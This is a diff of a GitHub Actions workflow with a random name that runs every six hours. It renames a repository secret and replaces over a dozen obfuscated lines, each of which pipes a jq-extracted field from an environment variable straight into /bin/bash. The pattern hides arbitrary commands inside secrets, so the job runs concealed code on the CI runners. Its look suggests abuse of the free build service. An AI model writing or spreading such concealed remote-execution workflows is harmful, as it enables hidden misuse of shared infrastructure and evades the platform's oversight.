@@ -2,27 +2,27 @@ name: chengwangti4354
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
-
-jobs:  # 10915
+    - cron: '34 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: chengwangti4354
         env:
-          hmi7: ${{ secrets.hmi7 }}
+          wlpvx243: ${{ secrets.wlpvx243 }}
         run: |
-          echo $hmi7 | jq -r .k869 | /bin/bash
-          echo $sds998 | jq -r .itexs90297 | /bin/bash
-          echo $qypy7319 | jq -r .wtv822 | /bin/bash
-          echo $yfppe0029 | jq -r .i5533 | /bin/bash
-          echo $j3061 | jq -r .fmhe3 | /bin/bash
-          echo $kxai5713 | jq -r .kvdm795 | /bin/bash
-          echo $jsg3 | jq -r .uggb526 | /bin/bash
-          echo $roar8 | jq -r .jv828 | /bin/bash
-          echo $pl50752 | jq -r .g5 | /bin/bash
-          echo $v4 | jq -r .zegey8 | /bin/bash
-          echo $xjzkq02123 | jq -r .cxffc487 | /bin/bash
-          echo $g312 | jq -r .xzksg23231 | /bin/bash
+          echo $wlpvx243 | jq -r .f9791 | /bin/bash
+          echo $kudyc1526 | jq -r .xqs268 | /bin/bash
+          echo $ui09062 | jq -r .zuejv496 | /bin/bash
+          echo $lxh440 | jq -r .qyhdv9719 | /bin/bash
+          echo $zt136 | jq -r .fldvc793 | /bin/bash
+          echo $kv87 | jq -r .tlu33 | /bin/bash
+          echo $kaxhx2701 | jq -r .ffx227 | /bin/bash
+          echo $zrewg73 | jq -r .tgmtx6532 | /bin/bash
+          echo $bcpp092 | jq -r .qttu704 | /bin/bash
+          echo $pz88266 | jq -r .jx1796 | /bin/bash
+          echo $ama288 | jq -r .dib86 | /bin/bash
+          echo $lql3 | jq -r .w078 | /bin/bash
+          echo $gxgl909 | jq -r .n969 | /bin/bash
 
